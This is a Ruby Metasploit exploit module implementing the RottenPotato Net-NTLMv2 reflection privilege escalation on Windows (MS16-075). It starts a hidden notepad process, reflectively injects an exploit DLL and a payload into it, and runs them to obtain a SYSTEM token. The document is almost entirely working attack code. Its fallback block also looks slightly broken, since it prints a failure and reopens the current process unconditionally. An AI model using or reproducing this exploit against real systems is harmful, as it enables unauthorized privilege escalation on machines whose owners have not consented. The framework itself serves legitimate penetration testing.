# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core/post/windows/reflective_dll_injection&#039;

class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::FileInfo
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info={})
    super(update_info(info, {
      &#039;Name&#039;           => &#039;Windows Net-NTLMv2 Reflection DCOM/RPC&#039;,
      &#039;Description&#039;    => %q(
        Module utilizes the Net-NTLMv2 reflection between DCOM/RPC
        to achieve a SYSTEM handle for elevation of privilege. Currently the module
        does not spawn as SYSTEM, however once achieving a shell, one can easily
        use incognito to impersonate the token.
      ),
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;FoxGloveSec&#039;, # the original Potato exploit
          &#039;breenmachine&#039;, # Rotten Potato NG!
          &#039;Mumbai&#039; # Austin : port of RottenPotato for reflection & quick module
        ],
      &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;none&#039;,
          &#039;WfsDelay&#039; => &#039;20&#039;
        },
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic&#039;, {}],
          [&#039;Windows x86&#039;, { &#039;Arch&#039; => ARCH_X86 }],
          [&#039;Windows x64&#039;, { &#039;Arch&#039; => ARCH_X64 }]
        ],
      &#039;Payload&#039;         =>
        {
          &#039;DisableNops&#039; => true
        },
      &#039;References&#039;      =>
        [
          [&#039;MSB&#039;, &#039;MS16-075&#039;],
          [&#039;CVE&#039;, &#039;2016-3225&#039;],
          [&#039;URL&#039;, &#039;http://blog.trendmicro.com/trendlabs-security-intelligence/an-analysis-of-a-windows-kernel-mode-vulnerability-cve-2014-4113/&#039;],
          [&#039;URL&#039;, &#039;https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/&#039;],
          [&#039;URL&#039;, &#039;https://github.com/breenmachine/RottenPotatoNG&#039;]
        ],
      &#039;DisclosureDate&#039; => &#039;Jan 16 2016&#039;,
      &#039;DefaultTarget&#039;  => 0
    }))
  end

  def assign_target
    if target.name == &#039;Automatic&#039;
      case sysinfo["Architecture"]
      when &#039;x86&#039;
        vprint_status("Found we are on an x86 target")
        my_target = targets[1]
      when &#039;x64&#039;
        vprint_status("Found we are on an x64 target")
        my_target = targets[2]
      else
        fail_with(Failure::NoTarget, "Unable to determine target")
      end
    else
      my_target = target
    end
    return my_target
  end

  def verify_arch(my_target)
    if my_target["Arch"] != sysinfo["Architecture"]
      print_error("Assigned Target Arch = #{my_target.opts[&#039;Arch&#039;]}")
      print_error("Actual Target Arch = #{sysinfo[&#039;Architecture&#039;]}")
      fail_with(Failure::BadConfig, "Assigned Arch does not match reality")
    end
    if client.arch != sysinfo["Architecture"]
      fail_with(Failure::BadConfig, "Session/Target Arch mismatch; WOW64 not supported")
    else
      vprint_good("Current payload and target Arch match....")
    end
  end

  def check
    privs = client.sys.config.getprivs
    if privs.include?(&#039;SeImpersonatePrivilege&#039;)
      return Exploit::CheckCode::Appears
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    if is_system?
      fail_with(Failure::None, &#039;Session is already elevated&#039;)
    end
    my_target = assign_target
    print_status("#{my_target[&#039;Arch&#039;]}")
    verify_arch(my_target)
    if check == Exploit::CheckCode::Safe
      fail_with(Failure::NoAccess, &#039;User does not have SeImpersonate Privilege&#039;)
    end
    if my_target.opts[&#039;Arch&#039;] == &#039;x64&#039;
      dll_file_name = &#039;rottenpotato.x64.dll&#039;
      vprint_status("Assigning payload rottenpotato.x64.dll")
    elsif my_target.opts[&#039;Arch&#039;] == &#039;x86&#039;
      dll_file_name = &#039;rottenpotato.x86.dll&#039;
      vprint_status("Assigning payload rottenpotato.x86.dll")
    else
      fail_with(Failure::BadConfig, "Unknown target arch; unable to assign exploit code")
    end
    print_status(&#039;Launching notepad to host the exploit...&#039;)
    notepad_process = client.sys.process.execute(&#039;notepad.exe&#039;, nil, &#039;Hidden&#039; => true)
    begin
      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
      print_good("Process #{process.pid} launched.")
      print_error(&#039;Operation failed. Trying to elevate the current process...&#039;)
      process = client.sys.process.open
    end
    print_status("Reflectively injecting the exploit DLL into #{process.pid}...")
    library_path = ::File.join(Msf::Config.data_directory, "exploits", "rottenpotato", dll_file_name)
    library_path = ::File.expand_path(library_path)
    print_status("Injecting exploit into #{process.pid}...")
    exploit_mem, offset = inject_dll_into_process(process, library_path)
    print_status("Exploit injected. Injecting payload into #{process.pid}...")
    payload_mem = inject_into_process(process, payload.encoded)
    # invoke the exploit, passing in the address of the payload that
    # we want invoked on successful exploitation.
    print_status(&#039;Payload injected. Executing exploit...&#039;)
    process.thread.create(exploit_mem + offset, payload_mem)
    print_good(&#039;Exploit finished, wait for (hopefully privileged) payload execution to complete.&#039;)
  end
end

